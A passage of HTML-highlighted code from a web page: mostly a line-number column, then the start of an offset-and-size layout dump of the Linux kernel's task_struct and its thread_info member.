</span><span class="lnt">  25
</span><span class="lnt">  26
</span><span class="lnt">  27
</span><span class="lnt">  28
</span><span class="lnt">  29
</span><span class="lnt">  30
</span><span class="lnt">  31
</span><span class="lnt">  32
</span><span class="lnt">  33
</span><span class="lnt">  34
</span><span class="lnt">  35
</span><span class="lnt">  36
</span><span class="lnt">  37
</span><span class="lnt">  38
</span><span class="lnt">  39
</span><span class="lnt">  40
</span><span class="lnt">  41
</span><span class="lnt">  42
</span><span class="lnt">  43
</span><span class="lnt">  44
</span><span class="lnt">  45
</span><span class="lnt">  46
</span><span class="lnt">  47
</span><span class="lnt">  48
</span><span class="lnt">  49
</span><span class="lnt">  50
</span><span class="lnt">  51
</span><span class="lnt">  52
</span><span class="lnt">  53
</span><span class="lnt">  54
</span><span class="lnt">  55
</span><span class="lnt">  56
</span><span class="lnt">  57
</span><span class="lnt">  58
</span><span class="lnt">  59
</span><span class="lnt">  60
</span><span class="lnt">  61
</span><span class="lnt">  62
</span><span class="lnt">  63
</span><span class="lnt">  64
</span><span class="lnt">  65
</span><span class="lnt">  66
</span><span class="lnt">  67
</span><span class="lnt">  68
</span><span class="lnt">  69
</span><span class="lnt">  70
</span><span class="lnt">  71
</span><span class="lnt">  72
</span><span class="lnt">  73
</span><span class="lnt">  74
</span><span class="lnt">  75
</span><span class="lnt">  76
</span><span class="lnt">  77
</span><span class="lnt">  78
</span><span class="lnt">  79
</span><span class="lnt">  80
</span><span class="lnt">  81
</span><span class="lnt">  82
</span><span class="lnt">  83
</span><span class="lnt">  84
</span><span class="lnt">  85
</span><span class="lnt">  86
</span><span class="lnt">  87
</span><span class="lnt">  88
</span><span class="lnt">  89
</span><span class="lnt">  90
</span><span class="lnt">  91
</span><span class="lnt">  92
</span><span class="lnt">  93
</span><span class="lnt">  94
</span><span class="lnt">  95
</span><span class="lnt">  96
</span><span class="lnt">  97
</span><span class="lnt">  98
</span><span class="lnt">  99
</span><span class="lnt"> 100
</span><span class="lnt"> 101
</span><span class="lnt"> 102
</span><span class="lnt"> 103
</span><span class="lnt"> 104
</span><span class="lnt"> 105
</span><span class="lnt"> 106
</span><span class="lnt"> 107
</span><span class="lnt"> 108
</span><span class="lnt"> 109
</span><span class="lnt"> 110
</span><span class="lnt"> 111
</span><span class="lnt"> 112
</span><span class="lnt"> 113
</span><span class="lnt"> 114
</span><span class="lnt"> 115
</span><span class="lnt"> 116
</span><span class="lnt"> 117
</span><span class="lnt"> 118
</span><span class="lnt"> 119
</span><span class="lnt"> 120
</span><span class="lnt"> 121
</span><span class="lnt"> 122
</span><span class="lnt"> 123
</span><span class="lnt"> 124
</span><span class="lnt"> 125
</span><span class="lnt"> 126
</span><span class="lnt"> 127
</span><span class="lnt"> 128
</span><span class="lnt"> 129
</span><span class="lnt"> 130
</span><span class="lnt"> 131
</span><span class="lnt"> 132
</span><span class="lnt"> 133
</span><span class="lnt"> 134
</span><span class="lnt"> 135
</span><span class="lnt"> 136
</span><span class="lnt"> 137
</span><span class="lnt"> 138
</span><span class="lnt"> 139
</span><span class="lnt"> 140
</span><span class="lnt"> 141
</span><span class="lnt"> 142
</span><span class="lnt"> 143
</span><span class="lnt"> 144
</span><span class="lnt"> 145
</span><span class="lnt"> 146
</span><span class="lnt"> 147
</span><span class="lnt"> 148
</span><span class="lnt"> 149
</span><span class="lnt"> 150
</span><span class="lnt"> 151
</span><span class="lnt"> 152
</span><span class="lnt"> 153
</span><span class="lnt"> 154
</span><span class="lnt"> 155
</span><span class="lnt"> 156
</span><span class="lnt"> 157
</span><span class="lnt"> 158
</span><span class="lnt"> 159
</span><span class="lnt"> 160
</span><span class="lnt"> 161
</span><span class="lnt"> 162
</span><span class="lnt"> 163
</span><span class="lnt"> 164
</span><span class="lnt"> 165
</span><span class="lnt"> 166
</span><span class="lnt"> 167
</span><span class="lnt"> 168
</span><span class="lnt"> 169
</span><span class="lnt"> 170
</span><span class="lnt"> 171
</span><span class="lnt"> 172
</span><span class="lnt"> 173
</span><span class="lnt"> 174
</span><span class="lnt"> 175
</span><span class="lnt"> 176
</span><span class="lnt"> 177
</span><span class="lnt"> 178
</span><span class="lnt"> 179
</span><span class="lnt"> 180
</span><span class="lnt"> 181
</span><span class="lnt"> 182
</span><span class="lnt"> 183
</span><span class="lnt"> 184
</span><span class="lnt"> 185
</span><span class="lnt"> 186
</span><span class="lnt"> 187
</span><span class="lnt"> 188
</span><span class="lnt"> 189
</span><span class="lnt"> 190
</span><span class="lnt"> 191
</span><span class="lnt"> 192
</span><span class="lnt"> 193
</span><span class="lnt"> 194
</span><span class="lnt"> 195
</span><span class="lnt"> 196
</span><span class="lnt"> 197
</span><span class="lnt"> 198
</span><span class="lnt"> 199
</span><span class="lnt"> 200
</span><span class="lnt"> 201
</span><span class="lnt"> 202
</span><span class="lnt"> 203
</span><span class="lnt"> 204
</span><span class="lnt"> 205
</span><span class="lnt"> 206
</span><span class="lnt"> 207
</span><span class="lnt"> 208
</span><span class="lnt"> 209
</span><span class="lnt"> 210
</span><span class="lnt"> 211
</span><span class="lnt"> 212
</span><span class="lnt"> 213
</span><span class="lnt"> 214
</span><span class="lnt"> 215
</span><span class="lnt"> 216
</span><span class="lnt"> 217
</span><span class="lnt"> 218
</span><span class="lnt"> 219
</span><span class="lnt"> 220
</span><span class="lnt"> 221
</span><span class="lnt"> 222
</span><span class="lnt"> 223
</span><span class="lnt"> 224
</span><span class="lnt"> 225
</span><span class="lnt"> 226
</span><span class="lnt"> 227
</span><span class="lnt"> 228
</span><span class="lnt"> 229
</span><span class="lnt"> 230
</span><span class="lnt"> 231
</span><span class="lnt"> 232
</span><span class="lnt"> 233
</span><span class="lnt"> 234
</span><span class="lnt"> 235
</span><span class="lnt"> 236
</span><span class="lnt"> 237
</span><span class="lnt"> 238
</span><span class="lnt"> 239
</span><span class="lnt"> 240
</span><span class="lnt"> 241
</span><span class="lnt"> 242
</span><span class="lnt"> 243
</span><span class="lnt"> 244
</span><span class="lnt"> 245
</span><span class="lnt"> 246
</span><span class="lnt"> 247
</span><span class="lnt"> 248
</span><span class="lnt"> 249
</span><span class="lnt"> 250
</span><span class="lnt"> 251
</span><span class="lnt"> 252
</span><span class="lnt"> 253
</span><span class="lnt"> 254
</span><span class="lnt"> 255
</span><span class="lnt"> 256
</span><span class="lnt"> 257
</span><span class="lnt"> 258
</span><span class="lnt"> 259
</span><span class="lnt"> 260
</span><span class="lnt"> 261
</span><span class="lnt"> 262
</span><span class="lnt"> 263
</span><span class="lnt"> 264
</span><span class="lnt"> 265
</span><span class="lnt"> 266
</span><span class="lnt"> 267
</span><span class="lnt"> 268
</span><span class="lnt"> 269
</span><span class="lnt"> 270
</span><span class="lnt"> 271
</span><span class="lnt"> 272
</span><span class="lnt"> 273
</span><span class="lnt"> 274
</span><span class="lnt"> 275
</span><span class="lnt"> 276
</span><span class="lnt"> 277
</span><span class="lnt"> 278
</span><span class="lnt"> 279
</span><span class="lnt"> 280
</span><span class="lnt"> 281
</span><span class="lnt"> 282
</span><span class="lnt"> 283
</span><span class="lnt"> 284
</span><span class="lnt"> 285
</span><span class="lnt"> 286
</span><span class="lnt"> 287
</span><span class="lnt"> 288
</span><span class="lnt"> 289
</span><span class="lnt"> 290
</span><span class="lnt"> 291
</span><span class="lnt"> 292
</span><span class="lnt"> 293
</span><span class="lnt"> 294
</span><span class="lnt"> 295
</span><span class="lnt"> 296
</span><span class="lnt"> 297
</span><span class="lnt"> 298
</span><span class="lnt"> 299
</span><span class="lnt"> 300
</span><span class="lnt"> 301
</span><span class="lnt"> 302
</span><span class="lnt"> 303
</span><span class="lnt"> 304
</span><span class="lnt"> 305
</span><span class="lnt"> 306
</span><span class="lnt"> 307
</span><span class="lnt"> 308
</span><span class="lnt"> 309
</span><span class="lnt"> 310
</span><span class="lnt"> 311
</span><span class="lnt"> 312
</span><span class="lnt"> 313
</span><span class="lnt"> 314
</span><span class="lnt"> 315
</span><span class="lnt"> 316
</span><span class="lnt"> 317
</span><span class="lnt"> 318
</span><span class="lnt"> 319
</span><span class="lnt"> 320
</span><span class="lnt"> 321
</span><span class="lnt"> 322
</span><span class="lnt"> 323
</span><span class="lnt"> 324
</span><span class="lnt"> 325
</span><span class="lnt"> 326
</span><span class="lnt"> 327
</span><span class="lnt"> 328
</span><span class="lnt"> 329
</span><span class="lnt"> 330
</span><span class="lnt"> 331
</span><span class="lnt"> 332
</span><span class="lnt"> 333
</span><span class="lnt"> 334
</span><span class="lnt"> 335
</span><span class="lnt"> 336
</span><span class="lnt"> 337
</span><span class="lnt"> 338
</span><span class="lnt"> 339
</span><span class="lnt"> 340
</span><span class="lnt"> 341
</span><span class="lnt"> 342
</span><span class="lnt"> 343
</span><span class="lnt"> 344
</span><span class="lnt"> 345
</span><span class="lnt"> 346
</span><span class="lnt"> 347
</span><span class="lnt"> 348
</span><span class="lnt"> 349
</span><span class="lnt"> 350
</span><span class="lnt"> 351
</span><span class="lnt"> 352
</span><span class="lnt"> 353
</span><span class="lnt"> 354
</span><span class="lnt"> 355
</span><span class="lnt"> 356
</span><span class="lnt"> 357
</span><span class="lnt"> 358
</span><span class="lnt"> 359
</span><span class="lnt"> 360
</span><span class="lnt"> 361
</span><span class="lnt"> 362
</span><span class="lnt"> 363
</span><span class="lnt"> 364
</span><span class="lnt"> 365
</span><span class="lnt"> 366
</span><span class="lnt"> 367
</span><span class="lnt"> 368
</span><span class="lnt"> 369
</span><span class="lnt"> 370
</span><span class="lnt"> 371
</span><span class="lnt"> 372
</span><span class="lnt"> 373
</span><span class="lnt"> 374
</span><span class="lnt"> 375
</span><span class="lnt"> 376
</span><span class="lnt"> 377
</span><span class="lnt"> 378
</span><span class="lnt"> 379
</span><span class="lnt"> 380
</span><span class="lnt"> 381
</span><span class="lnt"> 382
</span><span class="lnt"> 383
</span><span class="lnt"> 384
</span><span class="lnt"> 385
</span><span class="lnt"> 386
</span><span class="lnt"> 387
</span><span class="lnt"> 388
</span><span class="lnt"> 389
</span><span class="lnt"> 390
</span><span class="lnt"> 391
</span><span class="lnt"> 392
</span><span class="lnt"> 393
</span><span class="lnt"> 394
</span><span class="lnt"> 395
</span><span class="lnt"> 396
</span><span class="lnt"> 397
</span><span class="lnt"> 398
</span><span class="lnt"> 399
</span><span class="lnt"> 400
</span><span class="lnt"> 401
</span><span class="lnt"> 402
</span><span class="lnt"> 403
</span><span class="lnt"> 404
</span><span class="lnt"> 405
</span><span class="lnt"> 406
</span><span class="lnt"> 407
</span><span class="lnt"> 408
</span><span class="lnt"> 409
</span><span class="lnt"> 410
</span><span class="lnt"> 411
</span><span class="lnt"> 412
</span><span class="lnt"> 413
</span><span class="lnt"> 414
</span><span class="lnt"> 415
</span><span class="lnt"> 416
</span><span class="lnt"> 417
</span><span class="lnt"> 418
</span><span class="lnt"> 419
</span><span class="lnt"> 420
</span><span class="lnt"> 421
</span><span class="lnt"> 422
</span><span class="lnt"> 423
</span><span class="lnt"> 424
</span><span class="lnt"> 425
</span><span class="lnt"> 426
</span><span class="lnt"> 427
</span><span class="lnt"> 428
</span><span class="lnt"> 429
</span><span class="lnt"> 430
</span><span class="lnt"> 431
</span><span class="lnt"> 432
</span><span class="lnt"> 433
</span><span class="lnt"> 434
</span><span class="lnt"> 435
</span><span class="lnt"> 436
</span><span class="lnt"> 437
</span><span class="lnt"> 438
</span><span class="lnt"> 439
</span><span class="lnt"> 440
</span><span class="lnt"> 441
</span><span class="lnt"> 442
</span><span class="lnt"> 443
</span><span class="lnt"> 444
</span><span class="lnt"> 445
</span><span class="lnt"> 446
</span><span class="lnt"> 447
</span><span class="lnt"> 448
</span><span class="lnt"> 449
</span><span class="lnt"> 450
</span><span class="lnt"> 451
</span><span class="lnt"> 452
</span><span class="lnt"> 453
</span><span class="lnt"> 454
</span><span class="lnt"> 455
</span><span class="lnt"> 456
</span><span class="lnt"> 457
</span><span class="lnt"> 458
</span><span class="lnt"> 459
</span><span class="lnt"> 460
</span><span class="lnt"> 461
</span><span class="lnt"> 462
</span><span class="lnt"> 463
</span><span class="lnt"> 464
</span><span class="lnt"> 465
</span><span class="lnt"> 466
</span><span class="lnt"> 467
</span><span class="lnt"> 468
</span><span class="lnt"> 469
</span><span class="lnt"> 470
</span><span class="lnt"> 471
</span><span class="lnt"> 472
</span><span class="lnt"> 473
</span><span class="lnt"> 474
</span><span class="lnt"> 475
</span><span class="lnt"> 476
</span><span class="lnt"> 477
</span><span class="lnt"> 478
</span><span class="lnt"> 479
</span><span class="lnt"> 480
</span><span class="lnt"> 481
</span><span class="lnt"> 482
</span><span class="lnt"> 483
</span><span class="lnt"> 484
</span><span class="lnt"> 485
</span><span class="lnt"> 486
</span><span class="lnt"> 487
</span><span class="lnt"> 488
</span><span class="lnt"> 489
</span><span class="lnt"> 490
</span><span class="lnt"> 491
</span><span class="lnt"> 492
</span><span class="lnt"> 493
</span><span class="lnt"> 494
</span><span class="lnt"> 495
</span><span class="lnt"> 496
</span><span class="lnt"> 497
</span><span class="lnt"> 498
</span><span class="lnt"> 499
</span><span class="lnt"> 500
</span><span class="lnt"> 501
</span><span class="lnt"> 502
</span><span class="lnt"> 503
</span><span class="lnt"> 504
</span><span class="lnt"> 505
</span><span class="lnt"> 506
</span><span class="lnt"> 507
</span><span class="lnt"> 508
</span><span class="lnt"> 509
</span><span class="lnt"> 510
</span><span class="lnt"> 511
</span><span class="lnt"> 512
</span><span class="lnt"> 513
</span><span class="lnt"> 514
</span><span class="lnt"> 515
</span><span class="lnt"> 516
</span><span class="lnt"> 517
</span><span class="lnt"> 518
</span><span class="lnt"> 519
</span><span class="lnt"> 520
</span><span class="lnt"> 521
</span><span class="lnt"> 522
</span><span class="lnt"> 523
</span><span class="lnt"> 524
</span><span class="lnt"> 525
</span><span class="lnt"> 526
</span><span class="lnt"> 527
</span><span class="lnt"> 528
</span><span class="lnt"> 529
</span><span class="lnt"> 530
</span><span class="lnt"> 531
</span><span class="lnt"> 532
</span><span class="lnt"> 533
</span><span class="lnt"> 534
</span><span class="lnt"> 535
</span><span class="lnt"> 536
</span><span class="lnt"> 537
</span><span class="lnt"> 538
</span><span class="lnt"> 539
</span><span class="lnt"> 540
</span><span class="lnt"> 541
</span><span class="lnt"> 542
</span><span class="lnt"> 543
</span><span class="lnt"> 544
</span><span class="lnt"> 545
</span><span class="lnt"> 546
</span><span class="lnt"> 547
</span><span class="lnt"> 548
</span><span class="lnt"> 549
</span><span class="lnt"> 550
</span><span class="lnt"> 551
</span><span class="lnt"> 552
</span><span class="lnt"> 553
</span><span class="lnt"> 554
</span><span class="lnt"> 555
</span><span class="lnt"> 556
</span><span class="lnt"> 557
</span><span class="lnt"> 558
</span><span class="lnt"> 559
</span><span class="lnt"> 560
</span><span class="lnt"> 561
</span><span class="lnt"> 562
</span><span class="lnt"> 563
</span><span class="lnt"> 564
</span><span class="lnt"> 565
</span><span class="lnt"> 566
</span><span class="lnt"> 567
</span><span class="lnt"> 568
</span><span class="lnt"> 569
</span><span class="lnt"> 570
</span><span class="lnt"> 571
</span><span class="lnt"> 572
</span><span class="lnt"> 573
</span><span class="lnt"> 574
</span><span class="lnt"> 575
</span><span class="lnt"> 576
</span><span class="lnt"> 577
</span><span class="lnt"> 578
</span><span class="lnt"> 579
</span><span class="lnt"> 580
</span><span class="lnt"> 581
</span><span class="lnt"> 582
</span><span class="lnt"> 583
</span><span class="lnt"> 584
</span><span class="lnt"> 585
</span><span class="lnt"> 586
</span><span class="lnt"> 587
</span><span class="lnt"> 588
</span><span class="lnt"> 589
</span><span class="lnt"> 590
</span><span class="lnt"> 591
</span><span class="lnt"> 592
</span><span class="lnt"> 593
</span><span class="lnt"> 594
</span><span class="lnt"> 595
</span><span class="lnt"> 596
</span><span class="lnt"> 597
</span><span class="lnt"> 598
</span><span class="lnt"> 599
</span><span class="lnt"> 600
</span><span class="lnt"> 601
</span><span class="lnt"> 602
</span><span class="lnt"> 603
</span><span class="lnt"> 604
</span><span class="lnt"> 605
</span><span class="lnt"> 606
</span><span class="lnt"> 607
</span><span class="lnt"> 608
</span><span class="lnt"> 609
</span><span class="lnt"> 610
</span><span class="lnt"> 611
</span><span class="lnt"> 612
</span><span class="lnt"> 613
</span><span class="lnt"> 614
</span><span class="lnt"> 615
</span><span class="lnt"> 616
</span><span class="lnt"> 617
</span><span class="lnt"> 618
</span><span class="lnt"> 619
</span><span class="lnt"> 620
</span><span class="lnt"> 621
</span><span class="lnt"> 622
</span><span class="lnt"> 623
</span><span class="lnt"> 624
</span><span class="lnt"> 625
</span><span class="lnt"> 626
</span><span class="lnt"> 627
</span><span class="lnt"> 628
</span><span class="lnt"> 629
</span><span class="lnt"> 630
</span><span class="lnt"> 631
</span><span class="lnt"> 632
</span><span class="lnt"> 633
</span><span class="lnt"> 634
</span><span class="lnt"> 635
</span><span class="lnt"> 636
</span><span class="lnt"> 637
</span><span class="lnt"> 638
</span><span class="lnt"> 639
</span><span class="lnt"> 640
</span><span class="lnt"> 641
</span><span class="lnt"> 642
</span><span class="lnt"> 643
</span><span class="lnt"> 644
</span><span class="lnt"> 645
</span><span class="lnt"> 646
</span><span class="lnt"> 647
</span><span class="lnt"> 648
</span><span class="lnt"> 649
</span><span class="lnt"> 650
</span><span class="lnt"> 651
</span><span class="lnt"> 652
</span><span class="lnt"> 653
</span><span class="lnt"> 654
</span><span class="lnt"> 655
</span><span class="lnt"> 656
</span><span class="lnt"> 657
</span><span class="lnt"> 658
</span><span class="lnt"> 659
</span><span class="lnt"> 660
</span><span class="lnt"> 661
</span><span class="lnt"> 662
</span><span class="lnt"> 663
</span><span class="lnt"> 664
</span><span class="lnt"> 665
</span><span class="lnt"> 666
</span><span class="lnt"> 667
</span><span class="lnt"> 668
</span><span class="lnt"> 669
</span><span class="lnt"> 670
</span><span class="lnt"> 671
</span><span class="lnt"> 672
</span><span class="lnt"> 673
</span><span class="lnt"> 674
</span><span class="lnt"> 675
</span><span class="lnt"> 676
</span><span class="lnt"> 677
</span><span class="lnt"> 678
</span><span class="lnt"> 679
</span><span class="lnt"> 680
</span><span class="lnt"> 681
</span><span class="lnt"> 682
</span><span class="lnt"> 683
</span><span class="lnt"> 684
</span><span class="lnt"> 685
</span><span class="lnt"> 686
</span><span class="lnt"> 687
</span><span class="lnt"> 688
</span><span class="lnt"> 689
</span><span class="lnt"> 690
</span><span class="lnt"> 691
</span><span class="lnt"> 692
</span><span class="lnt"> 693
</span><span class="lnt"> 694
</span><span class="lnt"> 695
</span><span class="lnt"> 696
</span><span class="lnt"> 697
</span><span class="lnt"> 698
</span><span class="lnt"> 699
</span><span class="lnt"> 700
</span><span class="lnt"> 701
</span><span class="lnt"> 702
</span><span class="lnt"> 703
</span><span class="lnt"> 704
</span><span class="lnt"> 705
</span><span class="lnt"> 706
</span><span class="lnt"> 707
</span><span class="lnt"> 708
</span><span class="lnt"> 709
</span><span class="lnt"> 710
</span><span class="lnt"> 711
</span><span class="lnt"> 712
</span><span class="lnt"> 713
</span><span class="lnt"> 714
</span><span class="lnt"> 715
</span><span class="lnt"> 716
</span><span class="lnt"> 717
</span><span class="lnt"> 718
</span><span class="lnt"> 719
</span><span class="lnt"> 720
</span><span class="lnt"> 721
</span><span class="lnt"> 722
</span><span class="lnt"> 723
</span><span class="lnt"> 724
</span><span class="lnt"> 725
</span><span class="lnt"> 726
</span><span class="lnt"> 727
</span><span class="lnt"> 728
</span><span class="lnt"> 729
</span><span class="lnt"> 730
</span><span class="lnt"> 731
</span><span class="lnt"> 732
</span><span class="lnt"> 733
</span><span class="lnt"> 734
</span><span class="lnt"> 735
</span><span class="lnt"> 736
</span><span class="lnt"> 737
</span><span class="lnt"> 738
</span><span class="lnt"> 739
</span><span class="lnt"> 740
</span><span class="lnt"> 741
</span><span class="lnt"> 742
</span><span class="lnt"> 743
</span><span class="lnt"> 744
</span><span class="lnt"> 745
</span><span class="lnt"> 746
</span><span class="lnt"> 747
</span><span class="lnt"> 748
</span><span class="lnt"> 749
</span><span class="lnt"> 750
</span><span class="lnt"> 751
</span><span class="lnt"> 752
</span><span class="lnt"> 753
</span><span class="lnt"> 754
</span><span class="lnt"> 755
</span><span class="lnt"> 756
</span><span class="lnt"> 757
</span><span class="lnt"> 758
</span><span class="lnt"> 759
</span><span class="lnt"> 760
</span><span class="lnt"> 761
</span><span class="lnt"> 762
</span><span class="lnt"> 763
</span><span class="lnt"> 764
</span><span class="lnt"> 765
</span><span class="lnt"> 766
</span><span class="lnt"> 767
</span><span class="lnt"> 768
</span><span class="lnt"> 769
</span><span class="lnt"> 770
</span><span class="lnt"> 771
</span><span class="lnt"> 772
</span><span class="lnt"> 773
</span><span class="lnt"> 774
</span><span class="lnt"> 775
</span><span class="lnt"> 776
</span><span class="lnt"> 777
</span><span class="lnt"> 778
</span><span class="lnt"> 779
</span><span class="lnt"> 780
</span><span class="lnt"> 781
</span><span class="lnt"> 782
</span><span class="lnt"> 783
</span><span class="lnt"> 784
</span><span class="lnt"> 785
</span><span class="lnt"> 786
</span><span class="lnt"> 787
</span><span class="lnt"> 788
</span><span class="lnt"> 789
</span><span class="lnt"> 790
</span><span class="lnt"> 791
</span><span class="lnt"> 792
</span><span class="lnt"> 793
</span><span class="lnt"> 794
</span><span class="lnt"> 795
</span><span class="lnt"> 796
</span><span class="lnt"> 797
</span><span class="lnt"> 798
</span><span class="lnt"> 799
</span><span class="lnt"> 800
</span><span class="lnt"> 801
</span><span class="lnt"> 802
</span><span class="lnt"> 803
</span><span class="lnt"> 804
</span><span class="lnt"> 805
</span><span class="lnt"> 806
</span><span class="lnt"> 807
</span><span class="lnt"> 808
</span><span class="lnt"> 809
</span><span class="lnt"> 810
</span><span class="lnt"> 811
</span><span class="lnt"> 812
</span><span class="lnt"> 813
</span><span class="lnt"> 814
</span><span class="lnt"> 815
</span><span class="lnt"> 816
</span><span class="lnt"> 817
</span><span class="lnt"> 818
</span><span class="lnt"> 819
</span><span class="lnt"> 820
</span><span class="lnt"> 821
</span><span class="lnt"> 822
</span><span class="lnt"> 823
</span><span class="lnt"> 824
</span><span class="lnt"> 825
</span><span class="lnt"> 826
</span><span class="lnt"> 827
</span><span class="lnt"> 828
</span><span class="lnt"> 829
</span><span class="lnt"> 830
</span><span class="lnt"> 831
</span><span class="lnt"> 832
</span><span class="lnt"> 833
</span><span class="lnt"> 834
</span><span class="lnt"> 835
</span><span class="lnt"> 836
</span><span class="lnt"> 837
</span><span class="lnt"> 838
</span><span class="lnt"> 839
</span><span class="lnt"> 840
</span><span class="lnt"> 841
</span><span class="lnt"> 842
</span><span class="lnt"> 843
</span><span class="lnt"> 844
</span><span class="lnt"> 845
</span><span class="lnt"> 846
</span><span class="lnt"> 847
</span><span class="lnt"> 848
</span><span class="lnt"> 849
</span><span class="lnt"> 850
</span><span class="lnt"> 851
</span><span class="lnt"> 852
</span><span class="lnt"> 853
</span><span class="lnt"> 854
</span><span class="lnt"> 855
</span><span class="lnt"> 856
</span><span class="lnt"> 857
</span><span class="lnt"> 858
</span><span class="lnt"> 859
</span><span class="lnt"> 860
</span><span class="lnt"> 861
</span><span class="lnt"> 862
</span><span class="lnt"> 863
</span><span class="lnt"> 864
</span><span class="lnt"> 865
</span><span class="lnt"> 866
</span><span class="lnt"> 867
</span><span class="lnt"> 868
</span><span class="lnt"> 869
</span><span class="lnt"> 870
</span><span class="lnt"> 871
</span><span class="lnt"> 872
</span><span class="lnt"> 873
</span><span class="lnt"> 874
</span><span class="lnt"> 875
</span><span class="lnt"> 876
</span><span class="lnt"> 877
</span><span class="lnt"> 878
</span><span class="lnt"> 879
</span><span class="lnt"> 880
</span><span class="lnt"> 881
</span><span class="lnt"> 882
</span><span class="lnt"> 883
</span><span class="lnt"> 884
</span><span class="lnt"> 885
</span><span class="lnt"> 886
</span><span class="lnt"> 887
</span><span class="lnt"> 888
</span><span class="lnt"> 889
</span><span class="lnt"> 890
</span><span class="lnt"> 891
</span><span class="lnt"> 892
</span><span class="lnt"> 893
</span><span class="lnt"> 894
</span><span class="lnt"> 895
</span><span class="lnt"> 896
</span><span class="lnt"> 897
</span><span class="lnt"> 898
</span><span class="lnt"> 899
</span><span class="lnt"> 900
</span><span class="lnt"> 901
</span><span class="lnt"> 902
</span><span class="lnt"> 903
</span><span class="lnt"> 904
</span><span class="lnt"> 905
</span><span class="lnt"> 906
</span><span class="lnt"> 907
</span><span class="lnt"> 908
</span><span class="lnt"> 909
</span><span class="lnt"> 910
</span><span class="lnt"> 911
</span><span class="lnt"> 912
</span><span class="lnt"> 913
</span><span class="lnt"> 914
</span><span class="lnt"> 915
</span><span class="lnt"> 916
</span><span class="lnt"> 917
</span><span class="lnt"> 918
</span><span class="lnt"> 919
</span><span class="lnt"> 920
</span><span class="lnt"> 921
</span><span class="lnt"> 922
</span><span class="lnt"> 923
</span><span class="lnt"> 924
</span><span class="lnt"> 925
</span><span class="lnt"> 926
</span><span class="lnt"> 927
</span><span class="lnt"> 928
</span><span class="lnt"> 929
</span><span class="lnt"> 930
</span><span class="lnt"> 931
</span><span class="lnt"> 932
</span><span class="lnt"> 933
</span><span class="lnt"> 934
</span><span class="lnt"> 935
</span><span class="lnt"> 936
</span><span class="lnt"> 937
</span><span class="lnt"> 938
</span><span class="lnt"> 939
</span><span class="lnt"> 940
</span><span class="lnt"> 941
</span><span class="lnt"> 942
</span><span class="lnt"> 943
</span><span class="lnt"> 944
</span><span class="lnt"> 945
</span><span class="lnt"> 946
</span><span class="lnt"> 947
</span><span class="lnt"> 948
</span><span class="lnt"> 949
</span><span class="lnt"> 950
</span><span class="lnt"> 951
</span><span class="lnt"> 952
</span><span class="lnt"> 953
</span><span class="lnt"> 954
</span><span class="lnt"> 955
</span><span class="lnt"> 956
</span><span class="lnt"> 957
</span><span class="lnt"> 958
</span><span class="lnt"> 959
</span><span class="lnt"> 960
</span><span class="lnt"> 961
</span><span class="lnt"> 962
</span><span class="lnt"> 963
</span><span class="lnt"> 964
</span><span class="lnt"> 965
</span><span class="lnt"> 966
</span><span class="lnt"> 967
</span><span class="lnt"> 968
</span><span class="lnt"> 969
</span><span class="lnt"> 970
</span><span class="lnt"> 971
</span><span class="lnt"> 972
</span><span class="lnt"> 973
</span><span class="lnt"> 974
</span><span class="lnt"> 975
</span><span class="lnt"> 976
</span><span class="lnt"> 977
</span><span class="lnt"> 978
</span><span class="lnt"> 979
</span><span class="lnt"> 980
</span><span class="lnt"> 981
</span><span class="lnt"> 982
</span><span class="lnt"> 983
</span><span class="lnt"> 984
</span><span class="lnt"> 985
</span><span class="lnt"> 986
</span><span class="lnt"> 987
</span><span class="lnt"> 988
</span><span class="lnt"> 989
</span><span class="lnt"> 990
</span><span class="lnt"> 991
</span><span class="lnt"> 992
</span><span class="lnt"> 993
</span><span class="lnt"> 994
</span><span class="lnt"> 995
</span><span class="lnt"> 996
</span><span class="lnt"> 997
</span><span class="lnt"> 998
</span><span class="lnt"> 999
</span><span class="lnt">1000
</span><span class="lnt">1001
</span><span class="lnt">1002
</span><span class="lnt">1003
</span><span class="lnt">1004
</span><span class="lnt">1005
</span><span class="lnt">1006
</span><span class="lnt">1007
</span><span class="lnt">1008
</span><span class="lnt">1009
</span><span class="lnt">1010
</span><span class="lnt">1011
</span><span class="lnt">1012
</span><span class="lnt">1013
</span><span class="lnt">1014
</span><span class="lnt">1015
</span><span class="lnt">1016
</span><span class="lnt">1017
</span><span class="lnt">1018
</span><span class="lnt">1019
</span><span class="lnt">1020
</span><span class="lnt">1021
</span><span class="lnt">1022
</span><span class="lnt">1023
</span><span class="lnt">1024
</span><span class="lnt">1025
</span><span class="lnt">1026
</span><span class="lnt">1027
</span><span class="lnt">1028
</span><span class="lnt">1029
</span><span class="lnt">1030
</span><span class="lnt">1031
</span><span class="lnt">1032
</span><span class="lnt">1033
</span><span class="lnt">1034
</span><span class="lnt">1035
</span><span class="lnt">1036
</span><span class="lnt">1037
</span><span class="lnt">1038
</span><span class="lnt">1039
</span><span class="lnt">1040
</span><span class="lnt">1041
</span><span class="lnt">1042
</span><span class="lnt">1043
</span><span class="lnt">1044
</span><span class="lnt">1045
</span><span class="lnt">1046
</span><span class="lnt">1047
</span><span class="lnt">1048
</span><span class="lnt">1049
</span><span class="lnt">1050
</span><span class="lnt">1051
</span><span class="lnt">1052
</span><span class="lnt">1053
</span><span class="lnt">1054
</span><span class="lnt">1055
</span><span class="lnt">1056
</span><span class="lnt">1057
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">*</span> <span class="n">offset</span>    <span class="o">|</span>  <span class="n">size</span> <span class="err">*/</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |    24 */</span>    <span class="k">struct</span> <span class="n">thread_info</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">syscall_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     4 */</span>        <span class="n">u32</span> <span class="n">status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   20      |     4 */</span>        <span class="n">u32</span> <span class="n">cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">thread_info</span><span class="p">;</span>
